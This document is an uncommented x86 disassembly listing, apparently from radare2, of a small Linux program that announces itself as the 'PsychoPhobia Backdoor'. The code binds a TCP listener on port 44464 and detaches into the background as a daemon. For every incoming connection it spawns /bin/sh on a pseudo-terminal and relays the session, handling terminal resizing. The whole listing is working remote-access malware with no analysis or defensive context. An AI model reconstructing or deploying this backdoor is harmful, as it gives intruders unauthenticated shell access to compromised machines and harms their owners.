xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x8048a50
pop ebx
add ebx, 0x1cf0
mov eax, dword [ebx + 0x98]
test eax, eax
je 0x8048a63
call eax
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
cmp dword [obj.completed.4], 0
jne 0x8048abd
jmp 0x8048a93
mov eax, dword [obj.p.3]
lea edx, [eax + 4]
mov dword [obj.p.3], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.3]
cmp dword [eax], 0
jne 0x8048a81
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048ab3
add esp, 0xfffffff4
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.4], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048ae9
add esp, 0xfffffff8
push obj.object.11
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x80495e1
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x80495d5
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 8
add esp, 0xfffffff8
push 1
push 0
call sym.imp.kill
add esp, 0x10
add esp, 0xfffffff8
push 0xf
push 0
call sym.imp.kill
add esp, 0x10
leave
ret
jmp dword [reloc.kill]
push ebp
mov ebp, esp
sub esp, 8
add esp, 0xfffffff8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
add esp, 0xfffffffc
push 1
push 0
push 0xffffffffffffffff
call sym.imp.waitpid
add esp, 0x10
leave
ret
jmp dword [reloc.signal]
jmp dword [reloc.waitpid]
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x80487bc
pop ebx
add ebx, 0x1f84
call loc.gcc2_compiled.
call sym.frame_dummy
call loc.gcc2_compiled._2
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 0x218
add esp, 0xfffffff8
push 2
push str._dev_ptmx
call sym.imp.open
add esp, 0x10
mov eax, eax
mov dword [fildes], eax
add esp, 0xfffffff4
mov eax, dword [fildes]
push eax
call sym.imp.close
add esp, 0x10
mov dword [var_204h], 0
nop
cmp dword [var_204h], 0xff
jle 0x8048bf1
jmp 0x8048ca0
add esp, 0xfffffffc
lea eax, [path]
push eax
push str._dev_pty
mov eax, dword [var_204h]
push eax
call loc.gcc2_compiled._4
add esp, 0x10
add esp, 0xfffffff8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov eax, eax
mov edx, dword [arg_ch]
mov dword [edx], eax
mov eax, dword [arg_ch]
cmp dword [eax], 0
jge 0x8048c34
jmp 0x8048c90
add esp, 0xfffffffc
lea eax, [path]
push eax
push str._dev_tty
mov eax, dword [var_204h]
push eax
call loc.gcc2_compiled._4
add esp, 0x10
add esp, 0xfffffff8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov eax, eax
mov edx, dword [arg_8h]
mov dword [edx], eax
mov eax, dword [arg_8h]
cmp dword [eax], 0
jge 0x8048c88
add esp, 0xfffffff4
mov eax, dword [arg_ch]
mov edx, dword [eax]
push edx
call sym.imp.close
add esp, 0x10
jmp 0x8048c90
mov eax, 1
jmp 0x8048ca4
nop
inc dword [var_204h]
jmp 0x8048be0
nop
lea esi, [esi]
xor eax, eax
jmp 0x8048ca4
leave
ret
push ebp
mov ebp, esp
sub esp, 0x40
push edi
push esi
lea eax, [var_14h]
lea edi, [var_14h]
mov esi, str.pqrstuvwxyzabcde
cld
mov ecx, 4
rep movsd dword es:[edi], dword ptr [esi]
movsb byte es:[edi], byte ptr [esi]
lea eax, [var_28h]
lea edi, [var_28h]
mov esi, str.0123456789abcdef
cld
mov ecx, 4
rep movsd dword es:[edi], dword ptr [esi]
movsb byte es:[edi], byte ptr [esi]
add esp, 0xfffffff4
mov eax, dword [src]
push eax
call sym.imp.strlen
add esp, 0x10
mov dword [var_2ch], eax
add esp, 0xfffffff8
mov eax, dword [src]
push eax
mov eax, dword [dest]
push eax
call sym.imp.strcpy
add esp, 0x10
mov eax, dword [dest]
mov edx, dword [var_2ch]
add eax, edx
mov edx, dword [arg_8h]
sar edx, 4
mov ecx, edx
and ecx, 0xf
lea edx, [var_14h]
mov cl, byte [ecx + edx]
mov byte [eax], cl
mov eax, dword [var_2ch]
mov ecx, dword [dest]
lea edx, [ecx + eax]
lea eax, [edx + 1]
mov edx, dword [arg_8h]
and edx, 0xf
lea ecx, [var_28h]
mov dl, byte [edx + ecx]
mov byte [eax], dl
mov eax, dword [var_2ch]
mov edx, dword [dest]
add eax, edx
lea edx, [eax + 2]
mov byte [edx], 0
lea esp, [var_48h]
pop esi
pop edi
leave
ret
jmp dword [reloc.strlen]
jmp dword [reloc.strcpy]
push ebp
mov ebp, esp
sub esp, 0x1881c
push edi
push esi
push ebx
add esp, 0xfffffffc
push 6
push 1
push 2
call sym.imp.socket
add esp, 0x10
mov eax, eax
mov dword [socket], eax
cmp dword [socket], 0
jge 0x8048d40
add esp, 0xfffffff4
push str.socket
call sym.imp.perror
add esp, 0x10
mov eax, 1
jmp 0x80495a6
mov esi, esi
add esp, 0xfffffff8
push 0x10
lea eax, [address]
push eax
call sym.imp.bzero
add esp, 0x10
mov word [address], 2
add esp, 0xfffffff4
push 0
call sym.imp.htonl
add esp, 0x10
mov eax, eax
mov edx, eax
mov dword [var_10h], edx
add esp, 0xfffffff4
push 0xadb0
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, eax
mov word [var_12h], dx
add esp, 0xfffffffc
push 0x10
lea eax, [address]
push eax
mov eax, dword [socket]
push eax
call sym.imp.bind
add esp, 0x10
mov eax, eax
test eax, eax
jge 0x8048db8
add esp, 0xfffffff4
push str.bind
call sym.imp.perror
add esp, 0x10
mov eax, 1
jmp 0x80495a6
add esp, 0xfffffff8
push 5
mov eax, dword [socket]
push eax
call sym.imp.listen
add esp, 0x10
mov eax, eax
test eax, eax
jge 0x8048df0
add esp, 0xfffffff4
push str.listen
call sym.imp.perror
add esp, 0x10
mov eax, 1
jmp 0x80495a6
lea esi, [esi]
add esp, 0xfffffff4
push str.PsychoPhobia_Backdoor_is_starting...
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
call sym.imp.fork
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
je 0x8048e40
add esp, 0xfffffff8
mov eax, dword [fildes]
push eax
push str.OK__pid___d_n
call sym.imp.printf
add esp, 0x10
xor eax, eax
jmp 0x80495a6
lea esi, [esi]
call sym.imp.setsid
add esp, 0xfffffff4
push 0x80496d3
call sym.imp.chdir
add esp, 0x10
add esp, 0xfffffff8
push 2
push str._dev_null
call sym.imp.open
add esp, 0x10
mov eax, eax
mov dword [fildes], eax
add esp, 0xfffffff8
push 0
mov eax, dword [fildes]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff8
push 1
mov eax, dword [fildes]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff8
push 2
mov eax, dword [fildes]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [fildes]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff8
push 1
push 1
call sym.imp.signal
add esp, 0x10
add esp, 0xfffffff8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
nop
jmp 0x8048ed7
jmp 0x80495a6
mov dword [var_30h], 0x10
add esp, 0xfffffffc
lea eax, [var_30h]
push eax
lea eax, [var_24h]
push eax
mov eax, dword [socket]
push eax
call sym.imp.accept
add esp, 0x10
mov eax, eax
mov dword [fd], eax
cmp dword [fd], 0
jge 0x8048f02
jmp 0x8048ed0
call sym.imp.fork
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
jne 0x8049592
lea eax, [ebp - 0x80c8]
mov dword [ebp - 0x80c8], 0x80496df
mov dword [ebp - 0x80c4], 0x80496e2
mov dword [ebp - 0x80c0], 0
lea eax, [ebp - 0x187d0]
mov dword [ebp - 0x84c8], eax
add esp, 0xfffffffc
push str._var_tmp
push str.HOME_s
lea eax, [ebp - 0x187d0]
push eax
call sym.imp.sprintf
add esp, 0x10
mov dword [ebp - 0x186cc], 0
lea esi, [esi]
add esp, 0xfffffffc
push 0x100
lea eax, [ebp - 0x186c8]
mov edx, dword [ebp - 0x186cc]
mov ecx, edx
mov edx, ecx
shl edx, 8
add eax, edx
push eax
mov eax, dword [fd]
push eax
call sym.imp.read
add esp, 0x10
mov eax, eax
mov dword [ebp - 0x186d0], eax
mov edx, dword [ebp - 0x186cc]
inc edx
lea eax, [edx*4]
lea edx, [ebp - 0x84c8]
lea ecx, [ebp - 0x186c8]
mov ebx, dword [ebp - 0x186cc]
mov esi, ebx
mov ebx, esi
shl ebx, 8
lea esi, [ebx + ecx]
mov dword [eax + edx], esi
inc dword [ebp - 0x186cc]
cmp dword [ebp - 0x186cc], 0xff
jg 0x8048ff0
cmp dword [ebp - 0x186d0], 0xff
jle 0x8048ff0
jmp 0x8048ff2
nop
jmp 0x8049015
mov eax, dword [ebp - 0x186cc]
dec eax
mov edx, eax
mov eax, edx
shl eax, 8
lea edx, [ebp - 0x186c8]
cmp byte [eax + edx], 0xa
jne 0x8049010
jmp 0x8049015
mov esi, esi
jmp 0x8048f70
mov eax, dword [ebp - 0x186cc]
inc eax
lea edx, [eax*4]
lea eax, [ebp - 0x84c8]
mov dword [edx + eax], 0
add esp, 0xfffffff8
push 0
push 0
call sym.imp.setpgid
add esp, 0x10
add esp, 0xfffffff8
lea eax, [var_3ch]
push eax
lea eax, [var_38h]
push eax
call sym.open_tty
add esp, 0x10
mov eax, eax
test eax, eax
jne 0x80490c0
lea eax, [ebp - 0x187e8]
lea edi, [ebp - 0x187e8]
mov esi, str.Cant_fork_pty__bye__n
cld
mov ecx, 5
rep movsd dword es:[edi], dword ptr [esi]
movsw word es:[edi], word ptr [esi]
add esp, 0xfffffffc
add esp, 0xfffffff4
lea eax, [ebp - 0x187e8]
push eax
call sym.imp.strlen
add esp, 0x10
mov eax, eax
push eax
lea eax, [ebp - 0x187e8]
push eax
mov eax, dword [fd]
push eax
call sym.imp.write
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [fd]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff4
push 0
call sym.imp.exit
add esp, 0x10
lea esi, [esi]
call sym.imp.fork
mov eax, eax
mov dword [pid], eax
cmp dword [pid], 0
jne 0x8049198
add esp, 0xfffffff4
mov eax, dword [var_3ch]
push eax
call sym.imp.close
add esp, 0x10
call sym.imp.setsid
add esp, 0xfffffff8
push 0x540e
mov eax, dword [var_38h]
push eax
call sym.imp.ioctl
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [fd]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [socket]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff8
push 0
push 1
call sym.imp.signal
add esp, 0x10
add esp, 0xfffffff8
push 0
push 0x11
call sym.imp.signal
add esp, 0x10
add esp, 0xfffffff8
push 0
mov eax, dword [var_38h]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff8
push 1
mov eax, dword [var_38h]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff8
push 2
mov eax, dword [var_38h]
push eax
call sym.imp.dup2
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [var_38h]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffffc
lea eax, [ebp - 0x84c8]
push eax
lea eax, [ebp - 0x80c8]
push eax
push str._bin_sh
call sym.imp.execve
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [var_38h]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff8
push sym.hangout
push 1
call sym.imp.signal
add esp, 0x10
add esp, 0xfffffff8
push sym.hangout
push 0xf
call sym.imp.signal
add esp, 0x10
nop
lea esi, [esi]
jmp 0x80491d7
jmp 0x8049540
xor eax, eax
mov ecx, 0x20
lea edx, [var_bch]
mov edi, edx
cld
rep stosd dword es:[edi], eax
mov eax, ecx
mov dword [ebp - 0x187ec], eax
mov eax, edi
mov dword [ebp - 0x187f0], eax
jmp 0x8049202
nop
lea esi, [esi]
jmp 0x80491d7
mov eax, dword [var_3ch]
mov edx, eax
shr edx, 5
lea eax, [edx*4]
lea edx, [var_bch]
mov ecx, dword [var_3ch]
mov ebx, ecx
and ebx, 0x1f
bts dword [eax + edx], ebx
mov eax, dword [fd]
mov edx, eax
shr edx, 5
lea eax, [edx*4]
lea edx, [var_bch]
mov ecx, dword [fd]
mov ebx, ecx
and ebx, 0x1f
bts dword [eax + edx], ebx
add esp, 0xfffffff4
push 0
push 0
push 0
lea eax, [var_bch]
push eax
mov eax, dword [var_3ch]
cmp eax, dword [fd]
jle 0x8049262
mov eax, dword [var_3ch]
inc eax
jmp 0x8049266
mov eax, dword [fd]
inc eax
push eax
call sym.imp.select
add esp, 0x20
mov eax, eax
test eax, eax
jge 0x8049280
jmp 0x8049540
lea esi, [esi]
mov ecx, dword [var_3ch]
mov edx, ecx
and edx, 0x1f
mov ebx, dword [var_3ch]
mov ecx, ebx
shr ecx, 5
lea ebx, [ecx*4]
lea ecx, [var_bch]
bt dword [ebx + ecx], edx
setb al
test al, al
je 0x8049308
add esp, 0xfffffffc
push 0x8000
lea eax, [ebp - 0x80bc]
push eax
mov eax, dword [var_3ch]
push eax
call sym.imp.read
add esp, 0x10
mov eax, eax
mov dword [ebp - 0x187f0], eax
cmp dword [ebp - 0x187f0], 0
jg 0x80492e0
jmp 0x8049540
lea esi, [esi]
add esp, 0xfffffffc
mov eax, dword [ebp - 0x187f0]
push eax
lea eax, [ebp - 0x80bc]
push eax
mov eax, dword [fd]
push eax
call sym.imp.write
add esp, 0x10
mov eax, eax
test eax, eax
jg 0x8049308
jmp 0x8049540
mov ecx, dword [fd]
mov edx, ecx
and edx, 0x1f
mov ebx, dword [fd]
mov ecx, ebx
shr ecx, 5
lea ebx, [ecx*4]
lea ecx, [var_bch]
bt dword [ebx + ecx], edx
setb al
test al, al
je 0x8049535
lea esi, [ebp - 0x80bc]
mov dword [ebp - 0x187f4], esi
add esp, 0xfffffffc
push 0x8000
lea eax, [ebp - 0x80bc]
push eax
mov eax, dword [fd]
push eax
call sym.imp.read
add esp, 0x10
mov eax, eax
mov dword [ebp - 0x187f0], eax
cmp dword [ebp - 0x187f0], 0
jg 0x8049371
jmp 0x8049540
add esp, 0xfffffffc
mov eax, dword [ebp - 0x187f0]
push eax
push 0x1d
lea eax, [ebp - 0x80bc]
push eax
call sym.imp.memchr
add esp, 0x10
mov dword [ebp - 0x187ec], eax
cmp dword [ebp - 0x187ec], 0
je 0x8049510
lea eax, [ebp - 0x80bc]
mov edx, dword [ebp - 0x187ec]
sub edx, eax
mov eax, dword [ebp - 0x187f0]
sub eax, edx
mov dword [ebp - 0x18800], eax
cmp dword [ebp - 0x18800], 5
jle 0x80493ce
mov dword [ebp - 0x18800], 5
add esp, 0xfffffffc
mov eax, dword [ebp - 0x18800]
push eax
mov eax, dword [ebp - 0x187ec]
push eax
lea eax, [ebp - 0x187fc]
push eax
call sym.imp.memcpy
add esp, 0x10
cmp dword [ebp - 0x18800], 4
jg 0x8049423
add esp, 0xfffffffc
mov edx, 5
mov eax, edx
sub eax, dword [ebp - 0x18800]
push eax
lea eax, [ebp - 0x187fc]
mov edx, eax
add edx, dword [ebp - 0x18800]
push edx
mov eax, dword [fd]
push eax
call sym.imp.read
add esp, 0x10
mov word [ebp - 0x18802], 0
mov word [ebp - 0x18804], 0
movzx ax, byte [ebp - 0x187fb]
mov edx, eax
shl edx, 8
movzx ax, byte [ebp - 0x187fa]
mov ecx, edx
add ecx, eax
mov word [ebp - 0x18806], cx
movzx ax, byte [ebp - 0x187f9]
mov edx, eax
shl edx, 8
movzx ax, byte [ebp - 0x187f8]
mov esi, edx
add esi, eax
mov word [ebp - 0x18808], si
add esp, 0xfffffffc
lea eax, [ebp - 0x18808]
push eax
push 0x5414
mov eax, dword [var_3ch]
push eax
call sym.imp.ioctl
add esp, 0x10
add esp, 0xfffffff8
push 0x1c
push 0
call sym.imp.kill
add esp, 0x10
add esp, 0xfffffffc
lea eax, [ebp - 0x80bc]
mov edx, dword [ebp - 0x187ec]
sub edx, eax
push edx
lea eax, [ebp - 0x80bc]
push eax
mov eax, dword [var_3ch]
push eax
call sym.imp.write
add esp, 0x10
lea eax, [ebp - 0x80bc]
mov edx, eax
add edx, dword [ebp - 0x187f0]
lea eax, [edx - 5]
mov edx, eax
sub edx, dword [ebp - 0x187ec]
mov dword [ebp - 0x18800], edx
cmp dword [ebp - 0x18800], 0
jle 0x804950c
add esp, 0xfffffffc
mov eax, dword [ebp - 0x18800]
push eax
mov eax, dword [ebp - 0x187ec]
add eax, 5
push eax
mov eax, dword [var_3ch]
push eax
call sym.imp.write
add esp, 0x10
jmp 0x8049535
mov esi, esi
add esp, 0xfffffffc
mov eax, dword [ebp - 0x187f0]
push eax
mov eax, dword [ebp - 0x187f4]
push eax
mov eax, dword [var_3ch]
push eax
call sym.imp.write
add esp, 0x10
mov eax, eax
test eax, eax
jg 0x8049535
jmp 0x8049540
jmp 0x80491d0
lea esi, [esi]
add esp, 0xfffffff4
mov eax, dword [fd]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [socket]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [var_3ch]
push eax
call sym.imp.close
add esp, 0x10
add esp, 0xfffffffc
push 0
push 0
mov eax, dword [pid]
push eax
call sym.imp.waitpid
add esp, 0x10
call sym.imp.vhangup
add esp, 0xfffffff4
push 0
call sym.imp.exit
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [fd]
push eax
call sym.imp.close
add esp, 0x10
jmp 0x8048ed0
lea esp, [ebp - 0x18828]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x80495fc
pop ebx
add ebx, 0x1144
nop
call loc.gcc2_compiled._1
pop ebx
leave
ret
jmp dword [reloc.write]
jmp dword [reloc.close]
jmp dword [reloc.perror]
jmp dword [reloc.fork]
jmp dword [reloc.fflush]
jmp dword [reloc.select]
jmp dword [reloc.htonl]
jmp dword [reloc.execve]
jmp dword [reloc.memchr]
jmp dword [reloc.accept]
jmp dword [reloc.listen]
jmp dword [reloc.setsid]
jmp dword [reloc.vhangup]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.chdir]
jmp dword [reloc.setpgid]
jmp dword [reloc.dup2]
jmp dword [reloc.printf]
jmp dword [reloc.bind]
jmp dword [reloc.memcpy]
jmp dword [reloc.open]
jmp dword [reloc.bzero]
jmp dword [reloc.exit]
jmp dword [reloc.ioctl]
jmp dword [reloc.htons]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
jmp dword [reloc.read]
